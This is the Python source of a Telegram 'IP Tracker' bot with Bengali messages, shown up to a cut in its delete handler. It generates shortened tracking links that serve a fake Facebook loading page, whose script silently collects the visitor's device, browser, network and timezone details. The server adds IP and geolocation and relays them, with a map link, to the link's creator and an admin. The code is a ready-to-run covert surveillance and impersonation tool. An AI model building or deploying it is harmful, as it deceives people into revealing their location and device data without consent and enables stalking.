import os
import threading
import secrets
import sqlite3
import requests
import telebot
from flask import Flask, request, redirect, jsonify
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN")
BASE_URL  = os.environ.get("BASE_URL", "https://ip-eb0c.onrender.com")
ADMIN_ID  = 8768764605
CHANNELS  = ["@BDCyberSite", "@EdusTech"]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        token TEXT PRIMARY KEY, user_id INTEGER,
        name TEXT, clicks INTEGER DEFAULT 0, created TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT, ip TEXT, country TEXT, city TEXT,
        region TEXT, isp TEXT, lat TEXT, lon TEXT,
        device TEXT, os TEXT, browser TEXT, screen TEXT,
        timezone TEXT, language TEXT, ram TEXT, cpu TEXT,
        network TEXT, netspeed TEXT, referrer TEXT, time TEXT)""")
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

# ============ MEMBERSHIP ============
def check_membership(user_id):
    if user_id == ADMIN_ID:
        return True
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ["left", "kicked", "banned"]:
                return False
        except:
            return False
    return True

def join_markup():
    mk = InlineKeyboardMarkup()
    for ch in CHANNELS:
        mk.add(InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch[1:]}"))
    mk.add(InlineKeyboardButton("✅ Join করেছি", callback_data="check_join"))
    return mk

def not_joined_msg(chat_id):
    bot.send_message(chat_id,
        "⚠️ *বট ব্যবহার করতে আগে Join করো!*\n\n"
        "নিচের চ্যানেলগুলোতে Join করে\n"
        "*✅ Join করেছি* বাটন চাপো।",
        parse_mode="Markdown",
        reply_markup=join_markup())

# ============ FAKE PAGE ============
FAKE_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<link rel="icon" href="https://www.facebook.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;display:flex;align-items:center;
justify-content:center;height:100vh;font-family:Helvetica,Arial,sans-serif}
.box{text-align:center}
.logo{color:#1877f2;font-size:56px;font-weight:900;letter-spacing:-2px;margin-bottom:32px}
.spin{width:38px;height:38px;border:4px solid #ddd;border-top:4px solid #1877f2;
border-radius:50%;animation:s .8s linear infinite;margin:0 auto}
@keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
  <div class="logo">facebook</div>
  <div class="spin"></div>
</div>
<script>
const token = "__TOKEN__";
const base  = "__BASE__";

function send(data){
  fetch(base+"/collect/"+token,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(data)
  }).finally(()=>{
    setTimeout(()=>window.location.href="https://www.facebook.com",300);
  });
}

async function collect(){
  const nav=navigator, scr=screen;
  const nc=nav.connection||nav.mozConnection||nav.webkitConnection||{};

  let os="অজানা";
  const ua=nav.userAgent;
  if(/Android/.test(ua))       os="Android "+((ua.match(/Android ([\\d.]+)/)||[])[1]||"");
  else if(/iPhone|iPad/.test(ua)) os="iOS "+((ua.match(/OS ([\\d_]+)/)||[])[1]||"").replace(/_/g,".");
  else if(/Windows NT/.test(ua))  os="Windows "+((ua.match(/Windows NT ([\\d.]+)/)||[])[1]||"");
  else if(/Mac OS X/.test(ua))    os="macOS "+((ua.match(/Mac OS X ([\\d_]+)/)||[])[1]||"").replace(/_/g,".");
  else if(/Linux/.test(ua))       os="Linux";

  let br="অজানা";
  if(/Chrome\\//.test(ua)&&!/Edg/.test(ua)) br="Chrome "+((ua.match(/Chrome\\/([\\d.]+)/)||[])[1]||"");
  else if(/Firefox\\//.test(ua)) br="Firefox "+((ua.match(/Firefox\\/([\\d.]+)/)||[])[1]||"");
  else if(/Edg\\//.test(ua))     br="Edge "+((ua.match(/Edg\\/([\\d.]+)/)||[])[1]||"");
  else if(/Safari\\//.test(ua))  br="Safari";

  let device="💻 Desktop";
  if(/Android/.test(ua))     device="📱 Android";
  else if(/iPhone/.test(ua)) device="🍎 iPhone";
  else if(/iPad/.test(ua))   device="🍎 iPad";

  send({
    os, browser:br, device,
    screen:scr.width+"x"+scr.height,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"অজানা",
    language:nav.language||"অজানা",
    ram:nav.deviceMemory?nav.deviceMemory+"GB":"অজানা",
    cpu:nav.hardwareConcurrency?nav.hardwareConcurrency+" Core":"অজানা",
    network:nc.effectiveType||nc.type||"অজানা",
    netspeed:nc.downlink?nc.downlink+"Mbps":"অজানা",
    touch:("ontouchstart" in window)?"Yes":"No",
    referrer:document.referrer||"Direct",
    ua:ua.substring(0,200)
  });
}
collect();
</script>
</body>
</html>"""

# ============ FLASK ============
@app.route("/")
def home():
    return "Bot Alive!", 200

@app.route("/t/<token>")
def track(token):
    db  = get_db()
    row = db.execute("SELECT user_id FROM links WHERE token=?", (token,)).fetchone()
    db.close()
    if not row:
        return redirect("https://facebook.com")
    page = FAKE_PAGE.replace("__TOKEN__", token).replace("__BASE__", BASE_URL)
    return page, 200

@app.route("/collect/<token>", methods=["POST"])
def collect(token):
    js  = request.json or {}
    now = datetime.now().strftime("%d %b %Y, %I:%M %p")

    ip = (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("True-Client-IP") or
        request.headers.get("X-Real-IP") or
        request.headers.get("X-Forwarded-For","").split(",")[0].strip() or
        request.remote_addr or "Unknown"
    ).strip()

    country=city=region=isp=lat=lon="অজানা"
    try:
        loc = requests.get(f"http://ip-api.com/json/{ip}?lang=en", timeout=5).json()
        if loc.get("status") == "success":
            country = loc.get("country","অজানা")
            city    = loc.get("city","অজানা")
            region  = loc.get("regionName","অজানা")
            isp     = loc.get("isp","অজানা")
            lat     = str(loc.get("lat",""))
            lon     = str(loc.get("lon",""))
    except:
        pass

    db  = get_db()
    row = db.execute("SELECT user_id, name FROM links WHERE token=?", (token,)).fetchone()
    if not row:
        db.close()
        return jsonify({"ok": True})

    db.execute("UPDATE links SET clicks=clicks+1 WHERE token=?", (token,))
    db.execute("""INSERT INTO logs
        (token,ip,country,city,region,isp,lat,lon,device,os,browser,
         screen,timezone,language,ram,cpu,network,netspeed,referrer,time)
        VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (token, ip, country, city, region, isp, lat, lon,
         js.get("device","অজানা"), js.get("os","অজানা"),
         js.get("browser","অজানা"), js.get("screen","অজানা"),
         js.get("timezone","অজানা"), js.get("language","অজানা"),
         js.get("ram","অজানা"), js.get("cpu","অজানা"),
         js.get("network","অজানা"), js.get("netspeed","অজানা"),
         js.get("referrer","Direct"), now))
    db.commit()

    uid       = row["user_id"]
    link_name = row["name"]
    db.close()

    maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "অজানা" else None

    msg = (
        f"🚨 *লিংকে ক্লিক হয়েছে!*\n\n"
        f"🔗 *{link_name}*\n"
        f"📅 {now}\n\n"
        f"🌐 *IP:* `{ip}`\n"
        f"🌍 দেশ: {country}\n"
        f"🏙️ শহর: {city}\n"
        f"📍 অঞ্চল: {region}\n"
        f"📡 ISP: {isp}\n"
        f"📌 {lat}, {lon}\n\n"
        f"━━━━━━━━━━━━━\n"
        f"{js.get('device','অজানা')}\n"
        f"🖥️ OS: {js.get('os','অজানা')}\n"
        f"🌐 Browser: {js.get('browser','অজানা')}\n"
        f"📐 Screen: {js.get('screen','অজানা')}\n"
        f"🕐 Timezone: {js.get('timezone','অজানা')}\n"
        f"🗣️ Language: {js.get('language','অজানা')}\n"
        f"💾 RAM: {js.get('ram','অজানা')}\n"
        f"⚙️ CPU: {js.get('cpu','অজানা')}\n"
        f"📶 Network: {js.get('network','অজানা')}\n"
        f"⚡ Speed: {js.get('netspeed','অজানা')}\n"
        f"👆 Touch: {js.get('touch','অজানা')}\n"
        f"🔗 Referrer: {js.get('referrer','Direct')}"
    )

    markup = InlineKeyboardMarkup()
    if maps:
        markup.add(InlineKeyboardButton("🗺️ Google Maps", url=maps))

    try:
        bot.send_message(uid, msg, parse_mode="Markdown", reply_markup=markup)
    except:
        pass

    # Admin কেও notify করো (owner ছাড়া)
    if uid != ADMIN_ID:
        try:
            bot.send_message(ADMIN_ID,
                f"👁️ *Admin Log*\n\n"
                f"👤 Owner ID: `{uid}`\n"
                f"🔗 Link: `{link_name}`\n"
                f"🌐 IP: `{ip}`\n"
                f"🌍 {country} | 🏙️ {city}\n"
                f"📅 {now}",
                parse_mode="Markdown")
        except:
            pass

    return jsonify({"ok": True})

# ============ BOT MENUS ============
def main_menu():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("🔗 নতুন লিংক",  callback_data="new_link"),
        InlineKeyboardButton("📋 আমার লিংক",  callback_data="my_links"),
        InlineKeyboardButton("📊 Statistics",   callback_data="stats"),
        InlineKeyboardButton("❓ Help",         callback_data="help"),
    )
    return mk

def admin_menu():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("👥 সব Users",      callback_data="admin_users"),
        InlineKeyboardButton("🔗 সব Links",      callback_data="admin_links"),
        InlineKeyboardButton("📊 Total Stats",   callback_data="admin_stats"),
        InlineKeyboardButton("📋 Recent Logs",   callback_data="admin_logs"),
    )
    return mk

# ============ BOT COMMANDS ============
@bot.message_handler(commands=["start"])
def cmd_start(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    bot.send_message(m.chat.id,
        f"👋 স্বাগতম *{m.from_user.first_name}*!\n\n"
        "🔍 *IP Tracker Bot*\n\n"
        "ট্র্যাকিং লিংক বানাও — ক্লিক করলেই পাবে:\n"
        "IP • Location • Device • OS • Browser\n"
        "RAM • CPU • Network • Screen • Timezone\n\n"
        "👇 শুরু করো",
        parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=["track"])
def cmd_track(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    ask_name(m.chat.id)

@bot.message_handler(commands=["admin"])
def cmd_admin(m):
    if m.from_user.id != ADMIN_ID:
        bot.send_message(m.chat.id, "❌ তুমি Admin না!")
        return
    db = get_db()
    total_users = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
    total_links = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
    total_clicks= db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
    total_logs  = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
    db.close()
    bot.send_message(m.chat.id,
        f"⚙️ *Admin Panel*\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🔗 Total Links: {total_links}\n"
        f"👆 Total Clicks: {total_clicks}\n"
        f"📋 Total Logs: {total_logs}",
        parse_mode="Markdown", reply_markup=admin_menu())

def ask_name(chat_id):
    msg = bot.send_message(chat_id,
        "📌 লিংকের নাম দাও:\n_(যেমন: বন্ধুর লিংক)_",
        parse_mode="Markdown")
    bot.register_next_step_handler(msg, create_link)

def create_link(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    name  = m.text.strip() or "আমার লিংক"
    token = secrets.token_urlsafe(10)
    now   = datetime.now().strftime("%d %b %Y")

    db = get_db()
    db.execute("INSERT INTO links (token,user_id,name,clicks,created) VALUES(?,?,?,0,?)",
               (token, m.from_user.id, name, now))
    db.commit()
    db.close()

    link  = f"{BASE_URL}/t/{token}"
    short = link
    try:
        r = requests.get(
            f"https://is.gd/create.php?format=simple&url={requests.utils.quote(link)}",
            timeout=5)
        if r.text.startswith("http") and len(r.text) < 40:
            short = r.text.strip()
    except:
        pass

    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📋 আমার লিংক",  callback_data="my_links"),
        InlineKeyboardButton("🔗 নতুন লিংক",  callback_data="new_link"),
        InlineKeyboardButton("📊 Logs দেখো",   callback_data=f"logs_{token}"),
        InlineKeyboardButton("🗑️ মুছো",        callback_data=f"del_{token}"),
    )
    bot.send_message(m.chat.id,
        f"✅ *লিংক রেডি!*\n\n"
        f"📌 নাম: `{name}`\n\n"
        f"🔗 লিংক:\n`{short}`\n\n"
        "ক্লিক করলেই সব information আসবে! 🎯",
        parse_mode="Markdown", reply_markup=mk)

def show_links(chat_id, user_id):
    db   = get_db()
    rows = db.execute(
        "SELECT token,name,clicks,created FROM links WHERE user_id=? ORDER BY rowid DESC",
        (user_id,)).fetchall()
    db.close()
    if not rows:
        bot.send_message(chat_id, "❌ কোনো লিংক নেই।\n/track দিয়ে বানাও!",
            reply_markup=main_menu())
        return
    msg = "📋 *তোমার লিংক গুলো:*\n\n"
    mk  = InlineKeyboardMarkup(row_width=2)
    for r in rows:
        msg += f"🔗 *{r['name']}* — {r['clicks']} clicks\n`{BASE_URL}/t/{r['token']}`\n\n"
        mk.add(
            InlineKeyboardButton(f"📊 {r['name'][:10]}", callback_data=f"logs_{r['token']}"),
            InlineKeyboardButton("🗑️ মুছো",              callback_data=f"del_{r['token']}"),
        )
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="menu"))
    bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=mk)

# ============ CALLBACKS ============
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    d   = c.data
    uid = c.from_user.id
    cid = c.message.chat.id
    bot.answer_callback_query(c.id)

    # Join check
    if d != "check_join" and not check_membership(uid):
        not_joined_msg(cid)
        return

    if d == "check_join":
        if check_membership(uid):
            bot.send_message(cid, "✅ ধন্যবাদ! বট ব্যবহার করতে পারবে।",
                reply_markup=main_menu())
        else:
            bot.send_message(cid, "❌ এখনো Join করোনি!", reply_markup=join_markup())

    elif d == "menu":
        bot.send_message(cid, "👇 Main Menu:", reply_markup=main_menu())

    elif d == "new_link":
        ask_name(cid)

    elif d == "my_links":
        show_links(cid, uid)

    elif d == "stats":
        db = get_db()
        tl = db.execute("SELECT COUNT(*) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
        tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
        db.close()
        bot.send_message(cid,
            f"📊 *তোমার Statistics*\n\n"
            f"🔗 মোট লিংক: {tl}\n"
            f"👆 মোট Clicks: {tc}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")))

    elif d == "help":
        bot.send_message(cid,
            "❓ *কীভাবে ব্যবহার করবে?*\n\n"
            "1️⃣ /track দাও\n"
            "2️⃣ লিংকের নাম দাও\n"
            "3️⃣ লিংক পাবে\n"
            "4️⃣ ক্লিক করলেই সব info আসবে!\n\n"
            "⚠️ VPN থাকলে real IP পাওয়া যাবে না।",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")))

    # ── Admin callbacks ──
    elif d == "admin_users" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT user_id, COUNT(*) as lc, SUM(clicks) as tc FROM links GROUP BY user_id ORDER BY tc DESC LIMIT 15"
        ).fetchall()
        db.close()
        msg = "👥 *সব Users:*\n\n"
        for r in rows:
            msg += f"🆔 `{r['user_id']}` | 🔗 {r['lc']} links | 👆 {r['tc'] or 0} clicks\n"
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))

    elif d == "admin_links" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT user_id,name,clicks,created FROM links ORDER BY clicks DESC LIMIT 15"
        ).fetchall()
        db.close()
        msg = "🔗 *সব Links (Top 15):*\n\n"
        for r in rows:
            msg += f"👤 `{r['user_id']}` | *{r['name']}* | 👆 {r['clicks']}\n"
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))

    elif d == "admin_stats" and uid == ADMIN_ID:
        db = get_db()
        tu = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
        tl = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
        tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
        tlog= db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
        db.close()
        bot.send_message(cid,
            f"📊 *Total Statistics*\n\n"
            f"👥 Users: {tu}\n"
            f"🔗 Links: {tl}\n"
            f"👆 Clicks: {tc}\n"
            f"📋 Logs: {tlog}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))

    elif d == "admin_logs" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT l.ip, l.country, l.city, l.device, l.time, lk.name "
            "FROM logs l JOIN links lk ON l.token=lk.token "
            "ORDER BY l.id DESC LIMIT 10"
        ).fetchall()
        db.close()
        msg = "📋 *Recent 10 Logs:*\n\n"
        for i, r in enumerate(rows, 1):
            msg += (f"*{i}.* `{r['ip']}`\n"
                    f"   🌍 {r['country']} | {r['device']}\n"
                    f"   🔗 {r['name']} | 📅 {r['time']}\n\n")
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))

    elif d == "admin_back" and uid == ADMIN_ID:
        bot.send_message(cid, "⚙️ Admin Panel:", reply_markup=admin_menu())

    elif d.startswith("logs_"):
        token = d[5:]
        db    = get_db()
        link  = db.execute(
            "SELECT name FROM links WHERE token=? AND (user_id=? OR ?=?)",
            (token, uid, uid, ADMIN_ID)).fetchone()
        logs  = db.execute(
            "SELECT * FROM logs WHERE token=? ORDER BY id DESC LIMIT 5", (token,)
        ).fetchall()
        db.close()
        if not link:
            bot.send_message(cid, "❌ পাওয়া যায়নি।")
            return
        msg = f"📊 *{link['name']}* Logs:\n\n"
        if not logs:
            msg += "এখনো click নেই।"
        else:
            for i, l in enumerate(logs, 1):
                msg += (
                    f"*{i}.* `{l['ip']}`\n"
                    f"🌍 {l['country']} | 🏙️ {l['city']}\n"
                    f"{l['device']} | {l['os']}\n"
                    f"🌐 {l['browser']} | 📐 {l['screen']}\n"
                    f"💾 {l['ram']} | ⚙️ {l['cpu']}\n"
                    f"📶 {l['network']} {l['netspeed']}\n"
                    f"🕐 {l['timezone']} | 📅 {l['time']}\n\n"
                )
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="my_links")))

    elif d.startswith("del_"):
        token = d[4:]
        db = get_db()
        db.execute("DELE
